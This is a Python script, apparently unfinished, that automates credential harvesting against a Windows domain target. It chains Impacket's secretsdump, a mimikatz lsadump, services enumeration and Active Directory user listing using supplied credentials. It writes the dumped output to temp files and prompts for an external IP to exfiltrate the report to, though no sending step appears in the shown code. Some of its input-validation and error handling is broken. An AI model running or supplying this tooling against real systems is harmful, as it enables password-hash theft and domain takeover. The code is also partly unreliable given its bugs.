import argparse
import socket
import os

# Setup arg passing
parser = argparse.ArgumentParser("", formatter_class=argparse.RawTextHelpFormatter)
req_args = parser.add_argument_group('required arguments')

req_args.add_argument('-d', '--domain', help='The domain')#, required=True)
req_args.add_argument('-u', '--username', help='The username')#, required=True)
req_args.add_argument('-p', '--password', help='The password')#, required=True)

args = parser.parse_args()

# Set up variables
domain = args.domain
username = args.username
password = args.password
validExfilIP = False
validTargetIP = False
secretsdump_path = './impacket/examples/secretsdump.py'
mimikatz_path = './impacket/examples/mimikatz.py'
services_path = './impacket/examples/services.py'
getADUsers_path = './impacket/examples/getADUsers.py'


# Find out if the report should be exfiltrated
exfilBool = input("Would you like the generated report to be exfiltrated to an external domain? (y/n)\n")

while exfilBool.lower() != "y" and exfilBool.lower() != "n":
    exfilBool = input("Incorrect input detected, please try again (y/n)\n")

if exfilBool.lower() == "y":
    exfilBool = True
else:
    exfilBool = False

if exfilBool is True:
    while validExfilIP is False:
        # Check the Exfil IP address is in a valid format.
        exfilIP = input("Enter the IP you wish to exfiltrate the report to.\n")
        try:
            socket.inet_aton(exfilIP)
            validExfilIP = True
        except socket.error:
            exfilBool = input("The IP address entered was not valid, please try again.\n")

# Get the IP of the target machine.
while validTargetIP is False:
    targetIP = input("Enter the IP of the target system\n")
    try:
        socket.inet_aton(targetIP)
        validTargetIP = True
    except socket.error:
        targetIP = input("The target IP you entered is not valid, please try again.\n")

# Run the secretsdump script, saves to file
# FIND A WAY TO CREATE FOLDER TO SAVE TO.
secCommand = f"py {secretsdump_path} {domain}/{username}:{password}@{targetIP} >> c:\\temp\\secOutput.txt"

try:
    os.system(secCommand)
except KeyError as e:
    print(f"There was an error: {e}")

# Run the mimikatz script, this uses command.txt which elevates the token and does a lsadump.
mimiCommand = (f"py {mimikatz_path} -f ./command.txt "
               f"{domain}/{username}:{password}@{targetIP} >> c:\\temp\\mimiOutput.txt")
os.system(mimiCommand)

# Run services.py script.
servicesCommand = (f"py {services_path} {domain}/{username}:{password}@{targetIP} >> c:\\temp\\servicesOutput.txt")
os.system(servicesCommand)

# Run ADUsers script.
ADUsersCommand = (f"py {getADUsers_path} {domain}/{username}:{password}@{targetIP} >> c:\\temp\\ADUsersOutput.txt")
os.system(ADUsersCommand)

